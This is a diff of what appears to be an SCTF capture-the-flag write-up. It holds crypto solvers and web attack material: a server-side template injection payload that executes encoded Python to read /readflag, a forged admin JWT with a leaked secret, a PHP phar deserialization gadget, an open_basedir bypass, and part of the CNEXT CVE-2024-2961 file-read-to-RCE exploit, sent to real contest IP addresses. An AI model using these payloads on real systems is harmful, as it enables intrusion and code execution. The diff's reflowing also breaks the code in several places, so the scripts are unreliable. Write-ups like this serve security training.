@@ -2418,18 +2415,14 @@ key = [0x60,0x4a,0x8a,0x6e,0x9d,0xac,0xb1,0x67]
 rc4 = ARC4.new(bytes(key))
 data = rc4.decrypt(bytes(enc))
 print(data)
-```
-
-
-
-```
 import base64
 from Crypto.Util.number import *
 key = b"S0C0Z0Y0W"
 basedecode_enc = base64.b64decode("YgNxAGMDawJjZQR6B2IGYANiYQVxAG8JYQhkawZ3AW8JagluYAN2Am4GbQRmZAR6AWwBbQNlZANxCWsCaAlhZQRxAm4CbgRkZgl1AWIIawhmYAh3B2MBaAJmaghwAWoEbwliYgBwCWkIbQNuawlyAW0FYAhuYgB1Am8CawRuYAJxCG8CbgRgZAF3BWgJYQlhZwFzAGsJbwFlagV0CW0FawhgawNyCGkAbQNjYQh3Bm4FbwNkYAJ6A2IDaANmYwl2A2sEaQRlaglyAm0HaARmYQZ7AWsIbwZhYwB0B2sIYAlvYgN2AWsHYQJiZAByAGgDYANmYQB0BmwJYABhZwl1CGkEaQlmZQJzBm0IYQdjYwh6A20BbwVhZQl3CGoIaABmYAN1AW0IbQFvYAN0B2gFYAVhZAF1BW8HYQZvagZ6A20CaAhjZAl6BWkCYQhvZAN1AGgDaQJhYQZzCW8BYABjZAN0AW8BbQViZwVyA28JagJiagd1CGgDawhvYQJwB28GagNvYwd6AG0BYQFuawVyBGoBaQFkZAV1A24HbgdlYgd1AWwIYQNkagV6BW0DbglvZAl0A2kFaAhjawB3AmwAbwZgZwV3BGMEaQllYAhzAGsEYAFhYAJ6Bm4GaQdkagl6A20DawdkZgd3BW0JbgRgYQZyB2kJbANnZgdwA2gFaQFnYAh7BW4GbAdhYgd7Bm4DawJmawN0CWMDbgJgYwh0AmwGYQRiYQN2BmIGaAVkYwh2BmsDbAFhaglzB2kAbQBjZwJ1BGkCaghiZgByAWkJaAhhagZ3AG0JaghiYQVwAmMIaAFjYgVzBGh0dHA6Ly80Ny4xMDkuMTA2LjYyOjkwOTB7Im5hbWUiOiJTQ1RGIiwicGFzc3dvcmQiOiI4ODg4ODg4OCJ9")
 
 str_index = basedecode_enc.index(b"http")
-basedecode_enc = bytearray(basedecode_enc[:str_index])
+basedecode_enc = bytearray(basedecode_enc[:
+str_index])
 
 for i in range(len(basedecode_enc)):
     basedecode_enc[i] ^= key[i % len(key)]
@@ -2438,7 +2431,8 @@ str_all = "10669721913248017310606431714870563867652912174255756" + "7770857
 str_1 = "144819424465842307806353672547344125290716753535239658417883828941232509622838692761917211806963011168822281666033695157426515864265527046213326145174398018859056439431422867957079149967592078894410082695714160599647180947207504108618794637872261572262805565517756922288320779308895819726074229154002310375209"
 
 p = int(str_all[str_all.index(str_1):])
-q = int(str_all[:str_all.index(str_1)])
+q = int(str_all[:
+str_all.index(str_1)])
 e = 65537
 n = p * q
 f = (p - 1) * (q - 1)
@@ -2456,12 +2450,7 @@ table = "abcdefghijlmn"
 
 for i in range(len(flag)):
     print(flag[index.index(table[i])],end="")
-```
-
-
-
-```
-#include<stdio.h>
+    #include<stdio.h>
 
 int main()
 
@@ -2548,11 +2537,6 @@ int main()
 
     printf("n");
 }
-```
-
-
-
-```
 # sage 10.3
 from Crypto.Util.number import *
 from hashlib import md5
@@ -2588,7 +2572,8 @@ for root in res:
         FLAG2 = 'SCTF{'+md5(bq).hexdigest()+'}'
         print(FLAG1)
         print(FLAG2)
-    except:
+    
+except:
         pass
     
 """
@@ -2597,27 +2582,78 @@ SCTF{12899cda850fc484de8bce978839620d}
 SCTF{12899cda850fc484de8bce978839620d}
 SCTF{b3e6bcbb38a363c6189e8fcc4ef5350e}
 """
-```
-
-
-
-```
 30 82 08 15
     02 82 03 80
-        06 7f 0a a4 e9 74 a6 3a 1f fe 8d 5c 23 e5 d3 c4 31 65 3a e4 1c c7 46 f3 05 f6 2a 9f 19 3f 22 48 6c b7 ef 1b 27 56 34 81 8f 46 d0 75 2a 51 39 e1 99 18 27 1f a0 d7 d2 7b c6 60 d2 b7 24 14 d0 8e a5 2c 88 37 f9 49 c7 ba ec c3 02 9b a3 17 27 ef 3b f1 20 d9 92 6c 02 d7 41 2f 18 7e 98 dc 56 dd 07 b9 87 d2 cc 19 1a d5 61 64 a1 44 f2 8b 2f 70 a1 5d 10 55 88 a4 f2 7f bb 28 91 fc 52 7b d6 89 0a 5f 79 5b 5c 48 47 6a 6b f9 df b6 7b 7e 1e bc 7b 1b 08 6c d2 8b 58 c6 89 55 bf df 44 ec ce 11 ff ac df 65 45 51 b1 59 b7 83 20 40 cc 28 ee 8e be a4 8f 86 72 d5 3e 3d e8 8f cf bb 5f b2 76 b5 03 88 0d d3 4d 59 93 33 5d df 8c cb 96 c1 b4 d7 9f 50 2d 72 10 47 65 ad 9c 2b 18 58 a1 7a f3 d5 be 44 fa 3c bf 4b 8e eb 94 2a a3 94 2a 38 71 d2 c6 5a c7 02 89 12 3f c2 e9 f9 b2 5c bf cb d7 84 10 96 06 0f a5 04 c3 a0 7b 59 14 93 c6 4c 88 d0 bb 45 28 5a 85 b5 f7 d5 9d b9 8f aa 00 c2 cd 3f bb 63 da 59 92 05 f1 ca b0 df 52 cf 7b 43 1a 0e e4 a7 e3 56 96 54 6c e9 d0 3e f5 95 ec ee 92 d2 14 2c 92 e9 7d 27 44 93 97 03 45 5b 4c 70 de c2 7c 32 1e c6 b8 3c 02 96 22 e8 3a 9e 0d 55 d0 b2 58 d9 5d 4e 61 29 18 65 dd a7 6d c6 19 fc e9 57 79 90 42 9c 6e 77 e9 d4 07 81 e3 b2 f4 49 70 1b 83 e8 b0 c6 c6 6e b3 80 f9 64 73 e5 d4 22 ef ee 8b 2b 0e 88 b7 16 b0 0a 79 c9 d5 14 ca 3a d9 d2 de e5 26 60 9f f9 54 17 32 a4 19 8d 11 b9 db fb b2 e5 5c 24 d8 0e a5 22 d0 78 6e 33 55 f2 36 06 a5 d3 8a 72 de 4e ef c8 b6 bf c4 82 24 8a 28 62 cb 69 d8 e0 e3 d3 16 59 7d a9 d8 08 28 be 85 05 4f af 15 fc 36 9c aa ca fb 81 5c 69 73 c1 71 94 06 83 d5 6a 1a 19 67 b0 9b 7f fa 3f be 5b 2e 08 69 97 59 d8 4d 71 60 3f 51 64 47 69 6b b2 73 22 a6 9f 39 f6 ca 25 3e 00 dc 95 55 d5 f9 73 28 07 0c 46 7f 36 63 cc 48 9a ad 13 0f 28 c4 2f 35 bf 88 c5 71 92 0a b9 2a cb 8f 75 d0 3e 35 a7 51 03 c5 bd 96 f0 61 c9 6b d0 2a f6 e1 d1 91 b0 dd 16 4b c7 21 37 70 03 ed bf 5d 3e f6 5a 5e 90 46 38 53 56 b5 21 62 3b ee 37 f1 64 85 0a 0a 7a fb 0e d4 e7 e8 bd 9a fe 12 98 f7 d5 32 bc 9a d9 41 81 2d 33 2a ec e7 5d 1c cc b1 ff 69 fd 42 b3 1f 24 8a e5 79 d9 e0 d6 a1 4b 05 46 e7 84 ba 94 0e 32 bd 01 c3 95 df 8f f4 58 40 40 46 2b 54 79 fa 07 33 6d 50 3d c3 32 e7 0f c0 6d 94 63 29 7f c0 42 b6 23 d5 6f 87 ef aa 52 5a 9b 58 0e 31 4d 90 d1 21 18 93 ed 40 7a 26 50 8d ea a0 a1 3c 9e e8 c9 02 b9 e1 c3 a0 2f e9 a5 14 52 c0 2e e7 bd cc 85 c0 ef f6 38 91 e2 47 03 bd 26 5d 9c 9d bf 45 6e 2a f9 40 95 38 bc e0 fe cc 7e ba b2 02 66 aa ab 06 c7 66 c3 ea 6c da 9c b9 ba 5e 1d 02 4b 7d c3 d7 3e 76 f6 a3 33 19 7b ad 87 c4 fb 34 d5 65 a0 01 4a ac 72 82 5e 41 ad cf ea da dc 87 ac ef 40 ad 84 b7 c5 56 91 ab ad 56 1b e0 55 0e a0 a9 88 47 0c 42 74 32 ac b8 fe b2 b9 d2 d2 59 8f b2 08 9b b9 1b bd 9c b1 99 e8 92 d3 61 64 d8 bf 3e cd 54 57 6a 97 13 40 47 a1 2d a8 42 07 48 5b b4 e5
+067f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f2248
+6cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08e
+a52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd
+07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd689
+0a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11
+ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b5
+03880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5
+be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd784
+1096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3f
+bb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2
+142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b2
+58d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b
+83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2
+dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606
+a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be8505
+4faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08
+699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f9732807
+0c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103
+c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e904638
+5356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad94181
+2d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32
+bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042
+b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c9
+02b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e
+2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3
+d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40
+ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb208
+9bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5
     02 03
         01 00 01
     02 82 03
-        80 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+8004000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
+00
     02 81 81 00
-        80 63 d0 a2 18 76 e5 ce 1e 21 01 c2 00 15 52 90 66 ed 99 76 88 2d 10 02 a2 9e fe 0f 2f df cc 27 43 fc 9a 4b 5b 65 1c c9 71 08 69 9e ca 2f b1 f3 d9 31 75 ba e3 43 e7 c9 2e 4a 41 c7 2d 05 e5 70 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+8063d0a21876e5ce1e2101c20015529066ed9976882d1002a29efe0f2fdfcc27
+43fc9a4b5b651cc97108699eca2fb1f3d93175bae343e7c92e4a41c72d05e570
+1940000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
     02 81 81 00
-        e4 f0 fe 49 f9 ae 14 92 c0 97 a0 a9 88 fa 71 87 66 25 fe 4f ce 05 b0 20 4f 1f df 43 ec 64 b4 da c6 99 d2 8e 16 6e fd fc 75 62 d1 9e 58 c3 49 3d 91 00 36 5c f2 84 0b 46 c0 f6 ee 8d 96 48 07 17 0f f2 c1 3c 4e b8 01 2e ca b3 78 62 a3 90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-```
-
-
-
-```
+e4f0fe49f9ae1492c097a0a988fa71876625fe4fce05b0204f1fdf43ec64b4da
+c699d28e166efdfc7562d19e58c3493d9100365cf2840b46c0f6ee8d96480717
+0ff2c13c4eb8012ecab37862a390000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000
 # sage 10.3
 import itertools
 from Crypto.Util.number import *
@@ -2677,31 +2713,28 @@ d = inverse(e,phi)
 m = pow(c,d,n)
 print(long_to_bytes(m))
 # SCTF{0ne_4rgum3nt_1s_r0tt3n_0r4ng3s,_th3_wh0le_cert1fic4t3_1s_r0tt3n_0r4ng3s:XD}
-```
-
-
-
-```
 30 82 01 1e 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82 01 0b 00 30 82 01 06
     02 81 80
-        1b 5d 4f e0 aa 67 82 e2 75 d4 ce 12 a6 d5 75 62 ef bb e7 db 6f 52 77 25 5b 89 17 29 bf a2 a1 8d 3e db 49 84 3d 79 89 a3 7b 95 16 be 2d f8 ca 93 90 58 e6 5f 64 b5 fb 20 71 be a4 f5 f8 d1 39 28 95 b3 2b f0 37 7d 99 f4 f7 99 79 12 5e 5d b0 1c db 50 80 a1 c2 d6 65 c9 ac 31 b5 82 30 25 49 9c 95 13 27 7b ae 5e 7a 84 6c d2 71 c4 39 6e 2b a2 19 02 0e 58 a9 05 5c b1 8a 28 d3 6a 00 bf 71 7b
+1b5d4fe0aa6782e275d4ce12a6d57562efbbe7db6f5277255b891729bfa2a18d
+3edb49843d7989a37b9516be2df8ca939058e65f64b5fb2071bea4f5f8d13928
+95b32bf0377d99f4f79979125e5db01cdb5080a1c2d665c9ac31b5823025499c
+9513277bae5e7a846cd271c4396e2ba219020e58a9055cb18a28d36a00bf717b
     02 81 80
-        07 9f 5c cc 66 57 67 b4 a2 57 e5 c1 ff 56 e9 80 3d f2 e5 65 03 02 da ad 42 01 05 fe 67 24 47 74 3b d3 f0 be a1 c4 6a 49 87 93 2e 9a 88 6c a8 7a 7a fd 77 96 ab f1 e5 62 9c 49 86 fe 4f 22 e8 9c dc e7 ab b0 66 24 46 51 46 a2 e2 b6 ca 9a b3 19 6c ea b7 46 79 74 c1 dc 45 60 8a 20 04 11 b2 91 fd af 99 f7 d8 0d ce 4d b3 56 6f 4a 9e 2e 57 4c 62 24 cd 07 d8 06 38 d2 8f 78 20 bc f4 b4 91 43
-```
-
-
-
-```
+079f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe67244774
+3bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89c
+dce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291
+fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143
 30 82 01 1e 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82 01 0b 00 30 82 01 06
     02 81 80
-        07 1c 32 4e 87 69 49 31 87 c1 5f 72 d5 cc 69 57 29 b4 84 88 ee 3f bd 01 db 00 d5 c4 78 f0 8c 7c f3 20 93 ba 61 74 50 51 d3 e9 d1 69 52 3a a9 14 38 18 1f 47 67 9a ff 5e dd 22 95 0f 74 a1 eb 14 43 32 0a aa 5d 97 f5 c1 e8 1b 5e f9 a3 e6 9b a6 69 ab c4 c6 c4 b4 05 f5 08 8a 60 3a 74 f9 bc ef 88 82 3b 45 23 57 41 14 c8 10 60 08 38 72 81 96 f8 e5 e0 d4 ae ee ea b7 9d d8 68 3a 72 f3 c0 17
+071c324e8769493187c15f72d5cc695729b48488ee3fbd01db00d5c478f08c7c
+f32093ba61745051d3e9d169523aa91438181f47679aff5edd22950f74a1eb14
+43320aaa5d97f5c1e81b5ef9a3e69ba669abc4c6c4b405f5088a603a74f9bcef
+88823b4523574114c810600838728196f8e5e0d4aeeeeab79dd8683a72f3c017
     02 81 80
-        07 9f 5c cc 66 57 67 b4 a2 57 e5 c1 ff 56 e9 80 3d f2 e5 65 03 02 da ad 42 01 05 fe 67 24 47 74 3b d3 f0 be a1 c4 6a 49 87 93 2e 9a 88 6c a8 7a 7a fd 77 96 ab f1 e5 62 9c 49 86 fe 4f 22 e8 9c dc e7 ab b0 66 24 46 51 46 a2 e2 b6 ca 9a b3 19 6c ea b7 46 79 74 c1 dc 45 60 8a 20 04 11 b2 91 fd af 99 f7 d8 0d ce 4d b3 56 6f 4a 9e 2e 57 4c 62 24 cd 07 d8 06 38 d2 8f 78 20 bc f4 b4 91 43
-```
-
-
-
-```
+079f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe67244774
+3bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89c
+dce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291
+fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143
 from sage.all import *
 import itertools
 
@@ -2867,11 +2900,6 @@ if __name__ == '__main__':
     print(flag1)
     print(flag2)
     # SCTF{Ju5t_3njoy_th3_Du4l_4nd_Copper5m1th_m3thod_w1th_Ur_0wn_1mplem3nt4t10n}
-```
-
-
-
-```
 # sage 10.3
 from sage.groups.perm_gps.permgroup_named import SymmetricGroup
 from sage.all import *
@@ -2932,30 +2960,24 @@ m = 625
 n = 25
 primal_attack2(A,b,m,n,q,1)
 # SCTF{HunYu4n_TaiChi-5tyl3_P3rmut4t10nProup_m4st3r}
-```
-
-
-
-```
 POST /register HTTP/1.1
-Host: 124.220.229.60:8080
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Host: 124.220.229.60:
+8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+130.0) Gecko/20100101 Firefox/130.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br
-Referer: http://124.220.229.60:8080/register
+Referer: http://124.220.229.60:
+8080/register
 Content-Type: application/json
 Content-Length: 42
-Origin: http://124.220.229.60:8080
+Origin: http://124.220.229.60:
+8080
 Connection: close
 Priority: u=0
 
 {"username":"admin§1§","password":"admin123"}
-```
-
-
-
-```
 import time
 from datetime import datetime
 
@@ -2967,11 +2989,6 @@ timestamp = int(time.mktime(time.strptime(time_string, "%a, %d %b %Y %H:%
 
 # 打印时间戳
 print(timestamp)
-```
-
-
-
-```
 import json
 import hashlib
 import base64
@@ -2980,61 +2997,57 @@ from app import *
 from User import *
 
 def generateToken(user):
-    secret={"name":user,"is_admin":"1"}
+    secret={"name":
+user,"is_admin":"1"}
     
     verify_c=jwt.encode(secret, secret_key, algorithm='HS256')
-    infor={"name":user,"secret":verify_c}
+    infor={"name":
+user,"secret":
+verify_c}
     token=base64.b64encode(json.dumps(infor).encode()).decode()
     print(infor)
     print(token)
 
 secret_key="1727589825"
 generateToken('admin2060')
-```
-
-
-
-```
 POST /removeUser HTTP/1.1
-Host: 1.95.40.5:29351
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Host: 1.95.40.5:
+29351
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+130.0) Gecko/20100101 Firefox/130.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br
 Cookie: Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==
-Referer: http://124.220.229.60:8080/register
+Referer: http://124.220.229.60:
+8080/register
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
-Origin: http://124.220.229.60:8080
+Origin: http://124.220.229.60:
+8080
 Connection: close
 Priority: u=0
 
 username=admin§1§
-```
-
-
-
-```
 POST /admin HTTP/1.1
-Host: 1.95.40.5:29351
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Host: 1.95.40.5:
+29351
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+130.0) Gecko/20100101 Firefox/130.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br
-Referer: http://124.220.229.60:8080/register
+Referer: http://124.220.229.60:
+8080/register
 Cookie: Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 323
-Origin: http://124.220.229.60:8080
+Origin: http://124.220.229.60:
+8080
 Connection: close
 Priority: u=0
 
 code={{(g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower()))("import+base64;ex"%2b"ec(base64.b64decode('X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhIDpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCcvcmVhZGZsYWcnKS5yZWFkKCkp'));")}}
-```
-
-
-
-```
 POST /api/upload/image HTTP/1.1
 Host: 1.95.73.253
 Origin: http://1.95.73.253
@@ -3054,11 +3067,6 @@ Content-Type: image/jpeg
 
 aaa
 ------WebKitFormBoundarysy0Y2k0enM8x2GrW--
-```
-
-
-
-```
 <?php
 
 namespace PhpOfficePhpSpreadsheetCollection{
@@ -3132,38 +3140,14 @@ namespace {
     $phar->stopBuffering();
 
 }
-```
-
-
-
-```
 gzip 1.jpg
-```
-
-
-
-```
-{"status":200,"msg":"图片上传成功","data":{"name":"749e04b0905aa5bf0a364f86a70f7d74.jpg.jpg","url":"http://1.95.73.253/uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg"},"code":"100009"}
-```
-
-
-
-```
+{"status":
+200,"msg":"图片上传成功","data":{"name":"749e04b0905aa5bf0a364f86a70f7d74.jpg.jpg","url":"http://1.95.73.253/uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg"},"code":"100009"}
 /uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg
-```
-
-
-
-```
 <?php
     @mkdir('img');chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
     $data = file_get_contents($_POST['file']);
     echo "File contents: $data";
-```
-
-
-
-```
 #!/usr/bin/env python3
 #
 # CNEXT: PHP file-read to RCE (CVE-2024-2961)
@@ -3260,7 +3244,8 @@ class Exploit:
         def safe_download(path: str) -> bytes:
             try:
                 return self.remote.download(path)
-            except ConnectionError:
+            
+except ConnectionError:
                 failure("Target not [b]reachable[/] ?")
           
 
@@ -3270,7 +3255,8 @@ class Exploit:
 
         text = tf.random.string(50).encode()
         base64 = b64(text, misalign=True).decode()
-        path = f"data:text/plain;base64,{base64}"
+        path = f"data:
+text/plain;base64,{base64}"
       
         result = safe_download(path)
       
@@ -3286,7 +3272,8 @@ class Exploit:
 
         text = tf.random.string(50)
         base64 = b64(text.encode(), misalign=True).decode()
-        path = f"php://filter//resource=data:text/plain;base64,{base64}"
+        path = f"php://filter//resource=data:
+text/plain;base64,{base64}"
         if not check_token(text, path):
             failure("The [i]php://filter/[/] wrapper does not work")
 
@@ -3294,7 +3281,8 @@ class Exploit:
 
         text = tf.random.string(50)
         base64 = b64(compress(text.encode()), misalign=True).decode()
-        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"
+        path = f"php://filter/zlib.inflate/resource=data:
+text/plain;base64,{base64}"
 
         if not check_token(text, path):
             failure("The [i]zlib[/] extension is not enabled")
@@ -3378,7 +3366,8 @@ class Exploit:
             if region.permissions == "rw-p"
             and region.size >= HEAP_SIZE
